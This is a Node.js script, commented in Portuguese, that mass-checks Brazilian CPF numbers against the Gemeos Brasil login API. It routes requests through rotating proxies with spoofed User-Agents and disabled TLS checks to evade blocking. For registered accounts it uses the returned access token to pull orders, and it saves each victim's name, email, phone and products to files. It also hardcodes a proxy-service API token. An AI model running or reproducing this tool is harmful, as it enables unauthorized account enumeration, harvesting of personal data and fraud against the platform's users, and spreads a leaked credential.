/**
 * Checker da API Gemeos Brasil com Proxy Rotativo e Fallback
 * Faz requisições para verificar CPFs na API usando proxies da Webshare
 * Implementa fallback inteligente: proxy → sem proxy
 */

const axios = require('axios');
const https = require('https');
const fs = require('fs-extra');
const path = require('path');

class GemeosChecker {
  constructor() {
    this.proxyApiToken = 'qxew5x0zbdftbcsh63ql5flysll0jaf5u96msek9';
    this.proxyApiUrl = 'https://proxy.webshare.io/api/v2/proxy/list/';
    this.proxies = [];
    this.results = [];
    this.successCount = 0;
    this.errorCount = 0;
    this.registeredCount = 0;
    this.unregisteredCount = 0;
    this.batchSize = 20;
    this.delay = 2000;
    this.timeout = 10000;
    
    // Cache de proxies
    this.cacheDir = path.join(__dirname, '.cache');
    this.cacheFile = path.join(this.cacheDir, 'proxies.json');
    this.cacheExpiry = 24 * 60 * 60 * 1000; // 24 horas
  }

  /**
   * Cria configurações SSL padrão para requisições
   */
  getSSLConfig() {
    return {
      httpsAgent: new https.Agent({
        rejectUnauthorized: false,
        secureProtocol: 'TLSv1_2_method'
      }),
      proxy: false,
      maxRedirects: 5,
      validateStatus: function (status) {
        return status >= 200 && status < 300;
      }
    };
  }

  /**
   * Gera um User-Agent aleatório de navegador real
   */
  getRandomUserAgent() {
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
      'Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
  }

  /**
   * Verifica se o cache de proxies é válido
   */
  isCacheValid() {
    try {
      if (!fs.existsSync(this.cacheFile)) {
        return false;
      }
      
      const stats = fs.statSync(this.cacheFile);
      const now = Date.now();
      const cacheAge = now - stats.mtime.getTime();
      
      return cacheAge < this.cacheExpiry;
    } catch (error) {
      return false;
    }
  }

  /**
   * Carrega proxies do cache
   */
  loadFromCache() {
    try {
      const cacheData = fs.readJsonSync(this.cacheFile);
      this.proxies = cacheData.proxies || [];
      console.log(`📦 ${this.proxies.length} proxies carregados do cache`);
      return this.proxies;
    } catch (error) {
      console.log('❌ Erro ao carregar cache:', error.message);
      return [];
    }
  }

  /**
   * Salva proxies no cache
   */
  async saveToCache(proxies) {
    try {
      await fs.ensureDir(this.cacheDir);
      const cacheData = {
        proxies: proxies,
        timestamp: Date.now(),
        count: proxies.length
      };
      await fs.writeJson(this.cacheFile, cacheData, { spaces: 2 });
      console.log(`💾 ${proxies.length} proxies salvos no cache`);
    } catch (error) {
      console.log('❌ Erro ao salvar cache:', error.message);
    }
  }

  /**
   * Filtra apenas proxies brasileiros
   */
  filterBrazilianProxies(proxies) {
    const brazilianProxies = proxies.filter(proxy => {
      return proxy.country_code === 'BR' || 
             proxy.country_code === 'br' || 
             proxy.country_code === 'Brazil' ||
             proxy.country_code === 'brazil' ||
             proxy.country_code === 'BRASIL' ||
             proxy.country_code === 'brasil';
    });
    
    console.log(`🇧🇷 Filtrados ${brazilianProxies.length}/${proxies.length} proxies brasileiros`);
    return brazilianProxies;
  }

  /**
   * Testa um proxy específico
   */
  async testProxy(proxy) {
    try {
      const testConfig = {
        method: 'get',
        url: 'https://httpbin.org/ip',
        headers: {
          'User-Agent': this.getRandomUserAgent()
        },
        timeout: 5000,
        ...this.getSSLConfig()
      };
      
      testConfig.proxy = {
        host: proxy.proxy_address,
        port: proxy.port,
        auth: proxy.username && proxy.password ? {
          username: proxy.username,
          password: proxy.password
        } : undefined,
        protocol: 'http'
      };
      
      const response = await axios(testConfig);
      return response.status === 200;
    } catch (error) {
      return false;
    }
  }

  /**
   * Testa múltiplos proxies em paralelo
   */
  async testProxies(proxies, progressCallback) {
    console.log(`🧪 Testando ${proxies.length} proxies...`);
    
    const batchSize = 10;
    const validProxies = [];
    
    for (let i = 0; i < proxies.length; i += batchSize) {
      const batch = proxies.slice(i, i + batchSize);
      
      const promises = batch.map(async (proxy) => {
        const isValid = await this.testProxy(proxy);
        return isValid ? proxy : null;
      });
      
      const batchResults = await Promise.all(promises);
      const validBatch = batchResults.filter(proxy => proxy !== null);
      validProxies.push(...validBatch);
      
      if (progressCallback) {
        progressCallback(validProxies.length);
      }
      
      // Pequena pausa entre lotes
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    console.log(`✅ ${validProxies.length}/${proxies.length} proxies válidos encontrados`);
    return validProxies;
  }

  /**
   * Carrega proxies da API Webshare
   */
  async loadProxies(progressCallback) {
    // Verifica cache primeiro
    if (this.isCacheValid()) {
      const cachedProxies = this.loadFromCache();
      if (cachedProxies.length > 0) {
        this.proxies = cachedProxies;
        return this.proxies;
      }
    }
    
    console.log('🔄 Carregando proxies da Webshare...');
    
    try {
      const allProxies = [];
      let page = 1;
      const pageSize = 25;
      
      while (true) {
        const response = await axios.get(this.proxyApiUrl, {
          params: {
            mode: 'direct',
            page: page,
            page_size: pageSize
          },
          headers: {
            'Authorization': `Token ${this.proxyApiToken}`
          },
          timeout: 10000,
          ...this.getSSLConfig()
        });
        
        const proxies = response.data.results || [];
        if (proxies.length === 0) break;
        
        allProxies.push(...proxies);
        console.log(`📡 Carregados ${proxies.length} proxies da página ${page} (Total: ${allProxies.length})`);
        
        if (progressCallback) {
          progressCallback(allProxies.length);
        }
        
        page++;
        
        if (allProxies.length >= 1000) break;
      }
      
      // Filtra apenas proxies brasileiros
      console.log('🇧🇷 Filtrando proxies brasileiros...');
      const brazilianProxies = this.filterBrazilianProxies(allProxies);
      
      if (brazilianProxies.length === 0) {
        console.log('⚠️ Nenhum proxy brasileiro encontrado, usando todos os proxies');
        this.proxies = allProxies.slice(0, 1000);
      } else {
        console.log(`🇧🇷 Usando ${brazilianProxies.length} proxies brasileiros`);
        this.proxies = brazilianProxies.slice(0, 1000);
      }
      
      // Testa proxies antes de salvar no cache
      console.log('🧪 Testando proxies carregados...');
      const validProxies = await this.testProxies(this.proxies, progressCallback);
      
      if (validProxies.length === 0) {
        console.log('⚠️ Nenhum proxy válido encontrado, usando todos os proxies');
        this.proxies = this.proxies.slice(0, 1000);
      } else {
        console.log(`✅ Usando ${validProxies.length} proxies válidos`);
        this.proxies = validProxies.slice(0, 1000);
      }
      
      // Salva no cache
      await this.saveToCache(this.proxies);
      
      return this.proxies;
      
    } catch (error) {
      console.log('❌ Erro ao carregar proxies:', error.message);
      
      // Fallback para cache mesmo expirado
      const cachedProxies = this.loadFromCache();
      if (cachedProxies.length > 0) {
        console.log('📦 Usando cache expirado como fallback');
        this.proxies = cachedProxies;
        return this.proxies;
      }
      
      throw error;
    }
  }

  /**
   * Obtém um proxy aleatório
   */
  getRandomProxy() {
    if (this.proxies.length === 0) {
      return null;
    }
    
    const proxy = this.proxies[Math.floor(Math.random() * this.proxies.length)];
    return {
      host: proxy.proxy_address,
      port: proxy.port,
      auth: proxy.username && proxy.password ? {
        username: proxy.username,
        password: proxy.password
      } : undefined
    };
  }

  /**
   * Faz requisição para a API (com ou sem proxy)
   */
  async makeAPIRequest(cpf, proxy) {
    try {
      const axiosConfig = {
        method: 'post',
        url: 'https://api.gemeosbrasil.com.br/api/auth/login/client',
        data: { login: cpf },
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': this.getRandomUserAgent()
        },
        timeout: this.timeout,
        ...this.getSSLConfig()
      };
      
      if (proxy) {
        axiosConfig.proxy = {
          host: proxy.host,
          port: proxy.port,
          auth: proxy.auth,
          protocol: 'http'
        };
      }
      
      const response = await axios(axiosConfig);
      
      const result = {
        cpf: cpf,
        success: true,
        status: response.status,
        data: response.data,
        proxy: proxy ? `${proxy.host}:${proxy.port}` : 'Sem Proxy'
      };

      // Interpreta o resultado
      if (response.data && response.data.signIn === true) {
        this.unregisteredCount++;
        result.interpretation = 'not_registered';
      } else if (response.data && (response.data.signIn === false || (response.data.user && response.data.accessToken))) {
        this.registeredCount++;
        result.interpretation = 'registered';
        
        // Busca produtos se tem accessToken
        if (response.data.accessToken && response.data.user) {
          try {
            const productsConfig = {
              method: 'get',
              url: `https://api.gemeosbrasil.com.br/api/orders/user/${response.data.user.id}?authCode=`,
              headers: {
                'Authorization': `Bearer ${response.data.accessToken}`
              },
              timeout: this.timeout,
              ...this.getSSLConfig()
            };
            
            if (proxy) {
              productsConfig.proxy = {
                host: proxy.host,
                port: proxy.port,
                auth: proxy.auth,
                protocol: 'http'
              };
            }
            
            const productsResponse = await axios(productsConfig);
            
            result.products = {
              success: true,
              data: productsResponse.data,
              count: productsResponse.data?.length || 0
            };
          } catch (productsError) {
            result.products = {
              success: false,
              error: productsError.message
            };
          }
        }
      } else {
        this.unregisteredCount++;
        result.interpretation = 'not_registered';
      }

      this.successCount++;
      return result;

    } catch (error) {
      return {
        cpf: cpf,
        success: false,
        error: error.message,
        status: error.response?.status || 0,
        proxy: proxy ? `${proxy.host}:${proxy.port}` : 'Sem Proxy'
      };
    }
  }

  /**
   * Verifica um único CPF na API com fallback inteligente
   */
  async checkCPF(cpf, showProxyInfo = false) {
    const startTime = Date.now();
    
    try {
      const proxy = this.getRandomProxy();
      
      if (showProxyInfo) {
        if (proxy) {
          console.log(`🌐 Proxy: ${proxy.host}:${proxy.port} (${proxy.auth ? 'Auth' : 'No Auth'})`);
        } else {
          console.log(`🌐 Proxy: Sem proxy disponível`);
        }
      }
      
      // Tenta primeiro com proxy
      let result = await this.makeAPIRequest(cpf, proxy);
      
      // Se falhou com proxy (erro 403/407), tenta sem proxy
      if (!result.success && (result.status === 403 || result.status === 407)) {
        if (showProxyInfo) {
          console.log(`⚠️ Proxy falhou (${result.status}), tentando sem proxy...`);
        }
        result = await this.makeAPIRequest(cpf, null);
        if (result.success && showProxyInfo) {
          console.log(`✅ Sucesso sem proxy`);
        }
      }
      
      const endTime = Date.now();
      result.duration = endTime - startTime;
      
      return result;
      
    } catch (error) {
      const endTime = Date.now();
      return {
        cpf: cpf,
        success: false,
        error: error.message,
        status: error.response?.status || 0,
        duration: endTime - startTime,
        proxy: 'Error'
      };
    }
  }

  /**
   * Verifica múltiplos CPFs em lotes com proxies rotativos
   */
  async checkMultipleCPFs(cpfs) {
    const results = [];
    
    if (this.proxies.length === 0) {
      await this.loadProxies();
    }
    
    for (let i = 0; i < cpfs.length; i += this.batchSize) {
      const batch = cpfs.slice(i, i + this.batchSize);
      const batchNumber = Math.floor(i / this.batchSize) + 1;
      const totalBatches = Math.ceil(cpfs.length / this.batchSize);
      
      console.log(`\n🔄 LOTE ${batchNumber}/${totalBatches} - Processando ${batch.length} CPFs`);
      console.log(`📋 CPFs do lote: ${batch.slice(0, 3).join(', ')}${batch.length > 3 ? ` ... (+${batch.length - 3} mais)` : ''}`);
      
      const batchPromises = batch.map(async (cpf, index) => {
        try {
          await this.sleep(index * 100);
          
          const result = await this.checkCPF(cpf, true);
          
          const proxyInfo = result.proxy && result.proxy !== 'Sem Proxy' ? ` [${result.proxy}]` : ' [Sem Proxy]';
          const status = result.interpretation === 'registered' ? 'CADASTRADO' : 'NÃO CADASTRADO';
          console.log(`✅ CPF ${cpf}: ${status}${proxyInfo}`);
          
          return result;
        } catch (error) {
          console.error(`❌ Erro ao verificar CPF ${cpf}:`, error.message);
          return {
            cpf: cpf,
            success: false,
            error: error.message,
            timestamp: new Date().toISOString(),
            proxy: null
          };
        }
      });
      
      const batchResults = await Promise.all(batchPromises);
      results.push(...batchResults);
      
      if (i + this.batchSize < cpfs.length) {
        console.log(`⏱️ Aguardando ${this.delay / 1000}s antes do próximo lote...`);
        await this.sleep(this.delay);
      }
    }
    
    return results;
  }

  /**
   * Salva resultados em arquivo
   */
  async saveResults(filename = null) {
    if (!filename) {
      const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
      filename = `lista/valid-cpfs-${timestamp}.txt`;
    }

    const validCPFs = this.results.filter(result => 
      result.success && result.interpretation === 'registered'
    );

    if (validCPFs.length === 0) {
      console.log('Nenhum CPF válido encontrado para salvar.');
      return;
    }

    let txtContent = '';
    txtContent += '🔍 GEMEOS CPF CHECKER - CPFs VÁLIDOS ENCONTRADOS\n';
    txtContent += '='.repeat(60) + '\n\n';
    txtContent += `📅 Data/Hora: ${new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })}\n`;
    txtContent += `📊 Total de CPFs válidos: ${validCPFs.length}\n`;
    txtContent += `📝 Nota: Apenas CPFs com cadastro na plataforma Gemeos Brasil\n\n`;
    txtContent += '='.repeat(60) + '\n\n';

    validCPFs.forEach((result, index) => {
      txtContent += `📋 CPF ${index + 1}:\n`;
      txtContent += `   🔢 CPF: ${result.cpf}\n`;
      txtContent += `   ✅ Status: CADASTRADO\n`;
      txtContent += `   🌐 Proxy usado: ${result.proxy || 'Sem Proxy'}\n`;
      txtContent += `   ⏰ Verificado em: ${new Date(result.timestamp).toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })}\n\n`;

      if (result.data && result.data.user) {
        txtContent += `   👤 DADOS DO USUÁRIO:\n`;
        txtContent += `      🆔 ID: ${result.data.user.id}\n`;
        txtContent += `      📛 Nome: ${result.data.user.name}\n`;
        txtContent += `      📧 Email: ${result.data.user.email}\n`;
        txtContent += `      📱 Telefone: ${result.data.user.phone}\n`;
        txtContent += `      🔑 Access Token: ${result.data.accessToken ? 'Presente' : 'Ausente'}\n\n`;
      }

      if (result.products && result.products.success) {
        txtContent += `   📦 PRODUTOS/TÍTULOS:\n`;
        txtContent += `      📊 Quantidade: ${result.products.count}\n`;
        if (result.products.data && result.products.data.length > 0) {
          txtContent += `      📋 Lista: ${result.products.data.map(p => p.name || p.title || 'Produto').join(', ')}\n`;
        }
        txtContent += '\n';
      }

      txtContent += '─'.repeat(40) + '\n\n';
    });

    try {
      // Garantir que a pasta lista existe
      const listaDir = 'lista';
      if (!fs.existsSync(listaDir)) {
        fs.mkdirSync(listaDir, { recursive: true });
      }
      
      await fs.writeFile(filename, txtContent, 'utf8');
      console.log(`💾 Resultados salvos em: ${filename}`);
    } catch (error) {
      console.log('❌ Erro ao salvar resultados:', error.message);
    }
  }

  /**
   * Exibe resumo das verificações
   */
  showSummary() {
    console.log('\n' + '='.repeat(50));
    console.log('📊 RESUMO DAS VERIFICAÇÕES');
    console.log('='.repeat(50));
    console.log(`✅ Sucessos: ${this.successCount}`);
    console.log(`❌ Erros: ${this.errorCount}`);
    console.log(`👤 CPFs cadastrados: ${this.registeredCount}`);
    console.log(`❌ CPFs não cadastrados: ${this.unregisteredCount}`);
    console.log(`🌐 Proxies disponíveis: ${this.proxies.length}`);
    console.log('='.repeat(50));
  }

  /**
   * Função de sleep
   */
  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

module.exports = GemeosChecker;
